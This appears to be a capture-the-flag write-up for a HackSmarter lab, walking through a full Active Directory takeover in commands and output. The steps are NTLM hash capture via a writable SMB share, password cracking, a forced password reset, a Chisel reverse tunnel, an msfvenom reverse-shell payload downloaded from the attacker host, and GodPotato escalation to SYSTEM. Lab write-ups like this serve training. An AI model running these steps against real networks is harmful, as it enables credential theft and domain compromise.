---
layout: writeup
title: "ShareThePain"
platform: HackSmarter
image: "/assets/images/sharethepain.jpg"
difficulty: Easy
date: 2026-02-16
description: "Full Active Directory compromise."
tags: [HackSmarter, Active Directory, SMB, NTLM, MSSQL, Chisel, GodPotato, SeImpersonatePrivilege]
---
# ShareThePain (Hack Smarter)

# Scope and Objective

**Objective:** You're a **penetration tester** on the **Hack Smarter Red Team**. Your mission is to infiltrate and seize control of the client's entire Active Directory environment. This isn't just a test; it's a full-scale assault to expose and exploit every vulnerability.

**Initial Access:** For this engagement, you've been granted direct access to the internal network but no credentials.

**Execution:** Your objective is simple but demanding: **enumerate, exploit, and own.** Your ultimate goal is not just to get in, but to achieve a **full compromise**, elevating your privileges until you hold the keys to the entire domain.

# Reconnaissance

## Nmap

```jsx
# Nmap Scan Result (Important Findings Only)

Host: DC01.hack.smarter
Domain: hack.smarter
NetBIOS Domain: HACK
OS Version: Windows Server 2022 (Build 10.0.20348)
Role: Domain Controller

PORT     STATE SERVICE        VERSION
135/tcp  open  msrpc          Microsoft Windows RPC
139/tcp  open  netbios-ssn    Microsoft Windows NetBIOS
3268/tcp open  ldap           Microsoft Windows AD LDAP (Global Catalog)
3389/tcp open  ms-wbt-server  Microsoft Terminal Services
5985/tcp open  http           Microsoft WinRM (HTTPAPI 2.0)
9389/tcp open  mc-nmf         Active Directory Web Services
47001/tcp open  http          Microsoft WinRM HTTPAPI 2.0

RDP Information:
  Target_Name: HACK
  DNS_Domain_Name: hack.smarter
  DNS_Computer_Name: DC01.hack.smarter
  Product_Version: 10.0.20348

Key Indicators:
  - LDAP Global Catalog exposed (3268)
  - WinRM enabled (5985, 47001)
  - RDP enabled (3389)
  - Multiple MSRPC dynamic ports open
  - System confirmed as Active Directory Domain Controller

```

## SMB (135,139,445)

- Anonymous read is enabled

```jsx
                                                                                                                                                  
┌──(amsyar㉿kali)-[~/hacksmarter/sharethepain]
└─$ smbclient -L \\\\hack.smarter\\
Password for [WORKGROUP\amsyar]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Share           Disk      
        SYSVOL          Disk      Logon server share 

```

- We can connect to `share` share

```jsx
┌──(amsyar㉿kali)-[~/hacksmarter/sharethepain]
└─$ smbclient \\\\hack.smarter\\Share 
Password for [WORKGROUP\amsyar]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Sep 15 18:59:57 2025
  ..                                DHS        0  Fri Sep  5 23:46:21 2025

                31292671 blocks of size 4096. 27341064 blocks available
```

- We can write to the share!

```jsx
┌──(amsyar㉿kali)-[~/hacksmarter/sharethepain]
└─$ smbclient \\\\hack.smarter\\Share
Password for [WORKGROUP\amsyar]:
Try "help" to get a list of possible commands.
smb: \> put hacksmarter.txt
putting file hacksmarter.txt as \hacksmarter.txt (0.0 kB/s) (average 0.0 kB/s)
smb: \> dir
  .                                   D        0  Mon Feb 16 09:10:39 2026
  ..                                DHS        0  Fri Sep  5 23:46:21 2025
  hacksmarter.txt                     A        0  Mon Feb 16 09:10:39 2026

                31292671 blocks of size 4096. 27340741 blocks available
```

- Getting a user’s hash

```jsx
                                                                                                                                                    
┌──(amsyar㉿kali)-[~/hacksmarter/sharethepain/SMB_Killer]
└─$ python3 SMB_Killer.py -r 10.1.179.25 -l 10.200.35.181 -d hack.smarter -i tun0 -a Share -U '' -P '' -A

[SMB] NTLMv2-SSP Client   : 10.1.179.25
[SMB] NTLMv2-SSP Username : HACK\bob.ross
[SMB] NTLMv2-SSP Hash     : bob.ross::HACK:cfe4351e6ce4add9:D3B328C1C5346146C82D52DE61122482:010100000000000080DCE06A259FDC018C68D0D427FE7EB70000000002000800300043003300530001001E00570049004E002D003600530038004300310048004700590052005600420004003400570049004E002D00360053003800430031004800470059005200560042002E0030004300330053002E004C004F00430041004C000300140030004300330053002E004C004F00430041004C000500140030004300330053002E004C004F00430041004C000700080080DCE06A259FDC0106000400020000000800300030000000000000000100000000200000C75D2F16CA7EB16266A4DE126F2972D0420C1BAED85B17F32811E8C1630E22630A001000000000000000000000000000000000000900240063006900660073002F00310030002E003200300030002E00330035002E003100380031000000000000000000       
```

- Cracking Bob Ross’s hash

```jsx
┌──(amsyar㉿kali)-[~/hacksmarter/sharethepain/SMB_Killer]
└─$ john --format=netntlmv2 happy-accidents.hash --wordlist=/usr/share/wordlists/rockyou.txt

Created directory: /home/amsyar/.john
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
137Password123!@# (bob.ross)     
1g 0:00:00:21 DONE (2026-02-16 09:35) 0.04721g/s 626545p/s 626545c/s 626545C/s 137brovo..1379oil
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 

```

```jsx
bob.ross::137Password123!@#
```

## Pwning Bob Ross

```jsx
┌──(amsyar㉿kali)-[~/hacksmarter/sharethepain/SMB_Killer]
└─$ nxc smb hack.smarter -u 'bob.ross' -p '137Password123!@#' --shares
SMB         10.1.179.25     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hack.smarter) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.179.25     445    DC01             [+] hack.smarter\bob.ross:137Password123!@# 
SMB         10.1.179.25     445    DC01             [*] Enumerated shares
SMB         10.1.179.25     445    DC01             Share           Permissions     Remark
SMB         10.1.179.25     445    DC01             -----           -----------     ------
SMB         10.1.179.25     445    DC01             ADMIN$                          Remote Admin
SMB         10.1.179.25     445    DC01             C$                              Default share
SMB         10.1.179.25     445    DC01             IPC$            READ            Remote IPC
SMB         10.1.179.25     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.1.179.25     445    DC01             Share           READ,WRITE      
SMB         10.1.179.25     445    DC01             SYSVOL          READ            Logon server share 

```

### Enumerating AD as Bob Ross

![image.png](image.png)

- GenericAll permission over Alice Wonderland. This should allow us update her password

## Compromising alice wonderland

```jsx
┌──(amsyar㉿kali)-[~/tools]
└─$ net rpc password "alice.wonderland" "HackSmarter123" -U "hack.smarter"/"bob.ross"%'137Password123!@#' -S "10.1.179.25"

```

```jsx
┌──(amsyar㉿kali)-[~/tools]
└─$ nxc smb hack.smarter -u alice.wonderland -p HackSmarter123 --shares                                                   
SMB         10.1.179.25     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hack.smarter) (signing:True) (SMBv1:None) (Null Auth:True)                                                                                                                          
SMB         10.1.179.25     445    DC01             [+] hack.smarter\alice.wonderland:HackSmarter123 
SMB         10.1.179.25     445    DC01             [*] Enumerated shares
SMB         10.1.179.25     445    DC01             Share           Permissions     Remark
SMB         10.1.179.25     445    DC01             -----           -----------     ------
SMB         10.1.179.25     445    DC01             ADMIN$                          Remote Admin
SMB         10.1.179.25     445    DC01             C$                              Default share
SMB         10.1.179.25     445    DC01             IPC$            READ            Remote IPC
SMB         10.1.179.25     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.1.179.25     445    DC01             Share           READ,WRITE      
SMB         10.1.179.25     445    DC01             SYSVOL          READ            Logon server share 

```

- alice.wonderland is a member of the Remote User Group

```jsx
┌──(amsyar㉿kali)-[~/tools]
└─$ evil-winrm -u alice.wonderland -p HackSmarter123 -i dc01.hack.smarter

```

### Post Exploitation

```jsx
    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d--hs-          9/2/2025   7:33 PM                $Recycle.Bin
d--hsl          9/2/2025   5:08 PM                Documents and Settings
d-----          5/8/2021   1:20 AM                PerfLogs
d-r---          9/5/2025   8:34 PM                Program Files
d-----          9/3/2025   2:06 PM                Program Files (x86)
d--h--          9/5/2025   8:44 PM                ProgramData
d--hs-          9/2/2025   5:08 PM                Recovery
d-----         2/16/2026   4:18 PM                Share
d-----          9/3/2025   2:06 PM                SQL2019
d--hs-          9/2/2025   6:31 PM                System Volume Information
d-----          9/3/2025   2:01 PM                Temp
d-r---          9/3/2025   2:54 PM                Users
d-----          9/5/2025   8:46 PM                Windows
-a-hs-         2/16/2026   4:45 PM          12288 DumpStack.log.tmp
-a-hs-         2/16/2026   4:45 PM      738197504 pagefile.sys

```

- SQL2019 is on the machine, but the port wasn’t accessible from the outside

it looks like MSSQL is listening locally, but not externally

```jsx
TCP    127.0.0.1:1433         0.0.0.0:0              LISTENING       4144
```

- let’s see if we can use a port-forwarding tool like Chisel to forward a connection that we can reach externally. We’ll first need to start the chisel server locally:

```jsx
┌──(kali㉿kali)-[~/hacksmarter/sharethepain/loot]
└─$ chisel server -p 8000 --reverse
2026/02/18 10:19:50 server: Reverse tunnelling enabled
2026/02/18 10:19:50 server: Fingerprint hoYRCEXM7OuFL7cwl1e04w9Dn2IXszzV9ZaC0xMLS04=
2026/02/18 10:19:50 server: Listening on http://0.0.0.0:8000

```

- Then, we’ll need to upload the Windows version of the chisel binary and have it connect back to our server, forwarding the internal port 1433 to our server’s port 1433:

```jsx
*Evil-WinRM* PS C:\Users\alice.wonderland\Documents> .\chisel.exe client http://10.200.35.181:8000 R:1433:127.0.0.1:1433

```

- Now, we can run commands against our local port 1433 and they will be tunneled through chisel to run as though they are being run from inside the target machine:

```jsx
┌──(kali㉿kali)-[~/hacksmarter/sharethepain/loot]
└─$ nmap localhost -p 1433
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-18 10:56 EST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00012s latency).
Other addresses for localhost (not scanned): ::1

PORT     STATE SERVICE
1433/tcp open  ms-sql-s

Nmap done: 1 IP address (1 host up) scanned in 0.13 seconds
```

- Now we can connect to the MSSQL server from our attack machine

```jsx
┌──(kali㉿kali)-[~/hacksmarter/sharethepain/loot]
└─$ nxc mssql 127.0.0.1 -u 'alice.wonderland' -p 'HackSmarter123'
MSSQL       127.0.0.1       1433   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hack.smarter)
MSSQL       127.0.0.1       1433   DC01             [+] hack.smarter\alice.wonderland:HackSmarter123 (Pwn3d!)

```

- We can check the service account of MSSQL

```jsx
┌──(kali㉿kali)-[~/hacksmarter/sharethepain]
└─$ nxc mssql 127.0.0.1 -u 'alice.wonderland' -p 'HackSmarter123' -x whoami
MSSQL       127.0.0.1       1433   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hack.smarter)
MSSQL       127.0.0.1       1433   DC01             [+] hack.smarter\alice.wonderland:HackSmarter123 (Pwn3d!)
MSSQL       127.0.0.1       1433   DC01             [+] Executed command via mssqlexec
MSSQL       127.0.0.1       1433   DC01             nt service\mssql$sqlexpress

```

```jsx
nt service\mssql$sqlexpress
```

### Local Permission

```jsx
┌──(kali㉿kali)-[~/hacksmarter/sharethepain]
└─$ nxc mssql 127.0.0.1 -u 'alice.wonderland' -p 'HackSmarter123' -x 'whoami /priv'
MSSQL       127.0.0.1       1433   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hack.smarter)
MSSQL       127.0.0.1       1433   DC01             [+] hack.smarter\alice.wonderland:HackSmarter123 (Pwn3d!)
MSSQL       127.0.0.1       1433   DC01             [+] Executed command via mssqlexec
MSSQL       127.0.0.1       1433   DC01             PRIVILEGES INFORMATION
MSSQL       127.0.0.1       1433   DC01             ----------------------
MSSQL       127.0.0.1       1433   DC01             Privilege Name                Description                               State
MSSQL       127.0.0.1       1433   DC01             ============================= ========================================= ========
MSSQL       127.0.0.1       1433   DC01             SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
MSSQL       127.0.0.1       1433   DC01             SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
MSSQL       127.0.0.1       1433   DC01             SeMachineAccountPrivilege     Add workstations to domain                Disabled
MSSQL       127.0.0.1       1433   DC01             SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
MSSQL       127.0.0.1       1433   DC01             SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled
MSSQL       127.0.0.1       1433   DC01             SeImpersonatePrivilege        Impersonate a client after authentication Enabled
MSSQL       127.0.0.1       1433   DC01             SeCreateGlobalPrivilege       Create global objects                     Enabled
MSSQL       127.0.0.1       1433   DC01             SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```

- SeImpersonatePrivilege” is enabled in this session. We can use this to run a “Potato” attack. Using our evil-winrm session as the “alice.wonderland” user, we’ll upload GodPotato ,

```jsx
Privilege ni bermaksud:

> Process boleh "menyamar" (impersonate) security token client yang authenticate kepadanya.
> 

Dalam Windows security model:

- Setiap user ada access token
- Token tu ada SID + privilege
- Process boleh duplicate / impersonate token tertentu

Kalau ada SeImpersonate:

👉 Process boleh ambil token yang lebih tinggi

👉 Dan execute command sebagai token tu
```

Upload [GodPotato.exe](https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe) 

```jsx
*Evil-WinRM* PS C:\temp> iwr http://10.200.35.181:9000/godpotato.exe -OutFile godpotato.exe
```

Generate msfvenom payload

```jsx
┌──(kali㉿kali)-[~/hacksmarter/sharethepain]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.200.35.181 LPORT=443 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe

```

- Command ni **mencipta file Windows executable (`shell.exe`) yang bila dijalankan pada target, akan cuba buat reverse TCP connection ke IP `10.200.35.181` di port 443 supaya kita boleh kawal target melalui command prompt**.

Download `shall.exe` dari machine attacker ke dalam target window machine

```jsx
*Evil-WinRM* PS C:\temp> iwr http://10.200.35.181:9000/shell.exe -OutFile shell.exe

```

Since we have command execution as a user with “SeImpersonatePrivilege,” we can run GodPotato, which will run a specified command as root. We can use this to run the shall.exe binary to facilitate a reverse shell, which we’ll catch in a handler on our local machine:

```jsx
┌──(kali㉿kali)-[~/hacksmarter/sharethepain]
└─$ nxc mssql 127.0.0.1 -u alice.wonderland -p HackSmarter123 -x 'C:\temp\godpotato.exe -cmd "C:\temp\shell.exe'
MSSQL       127.0.0.1       1433   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hack.smarter)
MSSQL       127.0.0.1       1433   DC01             [+] hack.smarter\alice.wonderland:HackSmarter123 (Pwn3d!)
[21:16:27] ERROR    Error when attempting to execute command via xp_cmdshell: timed out                                                                                      mssqlexec.py:30
MSSQL       127.0.0.1       1433   DC01             [+] Executed command via mssqlexec

```

```jsx
┌──(kali㉿kali)-[~/hacksmarter/sharethepain]
└─$ nc -nvlp 443                                               
listening on [any] 443 ...
connect to [10.200.35.181] from (UNKNOWN) [10.1.179.25] 50368
Microsoft Windows [Version 10.0.20348.587]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

```

- Now that we have a shell as the “NT AUTHORITY\SYSTEM” account on the domain controller, we could technically read the root.txt file and get all the points for the challenge.

```jsx
C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 70F9-CC7D

 Directory of C:\Users\Administrator\Desktop

09/06/2025  07:52 PM    <DIR>          .
09/03/2025  06:47 PM    <DIR>          ..
09/02/2025  05:46 PM             2,308 Microsoft Edge.lnk
09/03/2025  01:10 PM               126 root.txt
               2 File(s)          2,434 bytes
               2 Dir(s)  112,228,458,496 bytes free

```